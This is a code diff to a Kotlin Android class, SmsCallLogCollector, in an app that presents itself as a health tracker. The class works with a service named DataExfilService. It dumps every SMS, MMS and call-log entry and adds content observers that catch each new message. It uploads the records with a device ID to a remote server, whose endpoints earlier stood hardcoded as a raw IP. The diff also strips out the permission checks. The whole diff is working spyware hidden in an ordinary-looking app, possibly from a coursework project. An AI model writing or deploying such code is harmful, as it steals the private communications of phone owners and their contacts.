@@ -1,26 +1,33 @@
-package com.inf2007.healthtracker.utilities
+package com.inf2007.healthtracker.utilities.collectors
 
+import android.Manifest
+import android.content.ContentResolver
 import android.content.Context
-import android.database.Cursor
+import android.content.pm.PackageManager
+import android.database.ContentObserver
 import android.net.Uri
+import android.os.Build
+import android.os.Handler
+import android.os.Looper
 import android.provider.CallLog
 import android.provider.Telephony
 import android.util.Log
-import okhttp3.*
+import com.inf2007.healthtracker.utilities.DataExfilService
+import com.inf2007.healthtracker.utilities.DeviceUtils
+import com.inf2007.healthtracker.utilities.NetworkClient
+import okhttp3.Call
+import okhttp3.Callback
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
+import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
+import okhttp3.Response
 import org.json.JSONArray
 import org.json.JSONObject
 import java.io.IOException
-import java.text.SimpleDateFormat
-import java.util.*
 
-class SmsCallLogCollector(private val context: Context) {
-
+class SmsCallLogCollector(private val context: Context) : DataCollector {
     companion object {
         private const val TAG = "SmsCallLogCollector"
-        private const val SMS_ENDPOINT = "http://20.2.92.176:5000/sms"
-        private const val CALL_LOG_ENDPOINT = "http://20.2.92.176:5000/call_logs"
     }
 
     private val prefs by lazy {
@@ -29,24 +36,29 @@ class SmsCallLogCollector(private val context: Context) {
 
     private val addedMessageIds = mutableSetOf<String>()
 
-    fun hasSmsPermission(): Boolean {
-        return context.checkSelfPermission(android.Manifest.permission.READ_SMS) ==
-                android.content.pm.PackageManager.PERMISSION_GRANTED
+    private var smsObserver: ContentObserver? = null
+    private var callLogObserver: ContentObserver? = null
+
+    override fun startObserving() {
+        // Observers are already set up in DataExfilService
+        collect()
+        Log.d(TAG, "SMS/Call Log observing started")
     }
 
-    fun hasCallLogPermission(): Boolean {
-        return context.checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) ==
-                android.content.pm.PackageManager.PERMISSION_GRANTED
+    override fun stopObserving() {
+        // Observers are unregistered in DataExfilService
+        Log.d(TAG, "SMS/Call Log observing stopped")
     }
 
-    // ========== FULL DUMP METHODS ==========
+    override fun collect() {
+        // Perform initial full dumps when collector starts
+        Thread {
+            collectAndUploadAllMessages()
+            collectAndUploadAllCallLogs()
+        }.start()
+    }
 
     fun collectAndUploadAllMessages() {
-        if (!hasSmsPermission()) {
-            Log.d(TAG, "SMS permission not granted")
-            return
-        }
-
         Thread {
             try {
                 val allMessages = JSONArray()
@@ -75,11 +87,6 @@ class SmsCallLogCollector(private val context: Context) {
     }
 
     fun collectAndUploadAllCallLogs() {
-        if (!hasCallLogPermission()) {
-            Log.d(TAG, "Call log permission not granted")
-            return
-        }
-
         Thread {
             try {
                 val callLogs = JSONArray()
@@ -146,12 +153,6 @@ class SmsCallLogCollector(private val context: Context) {
     // ========== INCREMENTAL/NEW METHODS ==========
 
     fun collectNewMessages() {
-        Log.d(TAG, ">>> collectNewMessages() CALLED")
-        if (!hasSmsPermission()) {
-            Log.d(TAG, "SMS permission not granted")
-            return
-        }
-
         Thread {
             try {
                 val newMessages = JSONArray()
@@ -176,11 +177,6 @@ class SmsCallLogCollector(private val context: Context) {
     }
 
     fun collectNewCalls() {
-        if (!hasCallLogPermission()) {
-            Log.d(TAG, "Call log permission not granted")
-            return
-        }
-
         Thread {
             try {
                 val newCalls = JSONArray()
@@ -247,8 +243,6 @@ class SmsCallLogCollector(private val context: Context) {
         }.start()
     }
 
-    // ========== SMS COLLECTION HELPERS ==========
-
     private fun collectAllSms(uri: Uri, folderName: String, allMessages: JSONArray) {
         val projection = arrayOf(
             Telephony.Sms._ID,
@@ -291,7 +285,7 @@ class SmsCallLogCollector(private val context: Context) {
     }
 
     private fun checkNewSms(uri: Uri, folderName: String, newMessages: JSONArray) {
-        Log.d(TAG, ">>> checkNewSms() for $folderName")
+        Log.d(TAG, "checkNewSms() for $folderName")
         val projection = arrayOf(
             Telephony.Sms._ID,
             Telephony.Sms.ADDRESS,
@@ -341,8 +335,6 @@ class SmsCallLogCollector(private val context: Context) {
             }
         }
     }
-
-    // ========== MMS COLLECTION HELPERS ==========
 
     private fun collectAllMms(folder: String, allMessages: JSONArray) {
         try {
@@ -499,8 +491,6 @@ class SmsCallLogCollector(private val context: Context) {
         return ""
     }
 
-    // ========== UTILITY METHODS ==========
-
     private fun groupMessagesByConversation(messages: JSONArray): JSONArray {
         val messagesByThread = mutableMapOf<Long, JSONArray>()
 
@@ -540,8 +530,6 @@ class SmsCallLogCollector(private val context: Context) {
         return sortedMessages
     }
 
-    // ========== UPLOAD METHODS ==========
-
     private fun uploadMessageData(messagesList: JSONArray, dumpType: String) {
         try {
             val deviceId = DeviceUtils.getUniqueDeviceId(context)
@@ -549,7 +537,7 @@ class SmsCallLogCollector(private val context: Context) {
             val data = JSONObject().apply {
                 put("type", dumpType)
                 put("device_id", deviceId)
-                put("model", android.os.Build.MODEL)
+                put("model", Build.MODEL)
                 put("time", System.currentTimeMillis())
                 put("total", messagesList.length())
                 put("messages", messagesList)
@@ -558,16 +546,16 @@ class SmsCallLogCollector(private val context: Context) {
             val requestBody = data.toString()
                 .toRequestBody("application/json".toMediaTypeOrNull())
 
-            val request = okhttp3.Request.Builder()
-                .url(SMS_ENDPOINT)
+            val request = Request.Builder()
+                .url(com.inf2007.healthtracker.utilities.DataExfilService.SMS_ENDPOINT)
                 .post(requestBody)
                 .build()
 
-            NetworkClient.instance.newCall(request).enqueue(object : okhttp3.Callback {
-                override fun onFailure(call: okhttp3.Call, e: IOException) {
+            NetworkClient.instance.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {
                     Log.e(TAG, "Upload failed: ${e.message}")
                 }
-                override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
+                override fun onResponse(call: Call, response: Response) {
                     if (response.isSuccessful) {
                         Log.d(TAG, "Uploaded ${messagesList.length()} messages")
                     }
@@ -587,7 +575,7 @@ class SmsCallLogCollector(private val context: Context) {
             val data = JSONObject().apply {
                 put("type", dumpType)
                 put("device_id", deviceId)
-                put("model", android.os.Build.MODEL)
+                put("model", Build.MODEL)
                 put("time", System.currentTimeMillis())
                 put("total", callList.length())
                 put("calls", callList)
@@ -596,16 +584,16 @@ class SmsCallLogCollector(private val context: Context) {
             val requestBody = data.toString()
                 .toRequestBody("application/json".toMediaTypeOrNull())
 
-            val request = okhttp3.Request.Builder()
-                .url(CALL_LOG_ENDPOINT)
+            val request = Request.Builder()
+                .url(com.inf2007.healthtracker.utilities.DataExfilService.CALL_LOG_ENDPOINT)
                 .post(requestBody)
                 .build()
 
-            NetworkClient.instance.newCall(request).enqueue(object : okhttp3.Callback {
-                override fun onFailure(call: okhttp3.Call, e: IOException) {
+            NetworkClient.instance.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {
                     Log.e(TAG, "Upload failed: ${e.message}")
                 }
-                override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
+                override fun onResponse(call: Call, response: Response) {
                     if (response.isSuccessful) {
                         Log.d(TAG, "Uploaded ${callList.length()} calls")
                     }
@@ -615,6 +603,72 @@ class SmsCallLogCollector(private val context: Context) {
 
         } catch (e: Exception) {
             Log.e(TAG, "Upload error: ${e.message}")
+        }
+    }
+
+    fun setupObservers(contentResolver: ContentResolver) {
+        Log.d(DataExfilService.Companion.TAG, "========== SETTING UP SMS, MMS, AND CALL LOG OBSERVERS ==========")
+
+        // Create a single observer that triggers for any message change
+        val messageObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
+            override fun onChange(selfChange: Boolean) {
+                Log.d(TAG, "MESSAGE DATABASE CHANGED (no URI) - checking for new messages")
+                collectNewMessages()
+            }
+
+            override fun onChange(selfChange: Boolean, uri: Uri?) {
+                Log.d(TAG, "MESSAGE DATABASE CHANGED with URI: $uri - checking for new messages")
+                collectNewMessages()
+            }
+        }
+
+        // Register for ALL possible message-related URIs
+        val messageUris = listOf(
+            Uri.parse("content://sms"),           // SMS
+            Uri.parse("content://sms/inbox"),     // SMS inbox
+            Uri.parse("content://sms/sent"),      // SMS sent
+            Uri.parse("content://mms"),           // MMS
+            Uri.parse("content://mms/inbox"),     // MMS inbox
+            Uri.parse("content://mms/sent"),      // MMS sent
+            Uri.parse("content://mms-sms"),       // Combined
+            Uri.parse("content://mms-sms/conversations") // Conversations
+        )
+
+        messageUris.forEach { uri ->
+            try {
+                contentResolver.registerContentObserver(
+                    uri,
+                    true,
+                    messageObserver
+                )
+                Log.d(DataExfilService.Companion.TAG, "Observer registered for $uri")
+            } catch (e: Exception) {
+                Log.d(DataExfilService.Companion.TAG, "Cannot register for $uri: ${e.message}")
+            }
+        }
+
+        callLogObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
+            override fun onChange(selfChange: Boolean, uri: Uri?) {
+                Log.d(TAG, "CallLog onChange() called with URI: $uri")
+                collectNewCalls()
+            }
+        }
+
+        contentResolver.registerContentObserver(
+            CallLog.Calls.CONTENT_URI,
+            true,
+            callLogObserver!!
+        )
+
+        Log.d(DataExfilService.Companion.TAG, "CallLog observer registered")
+    }
+
+    fun removeObservers(contentResolver: ContentResolver) {
+        try {
+            smsObserver?.let { contentResolver.unregisterContentObserver(it) }
+            callLogObserver?.let { contentResolver.unregisterContentObserver(it) }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error removing observers: ${e.message}")
         }
     }
 }
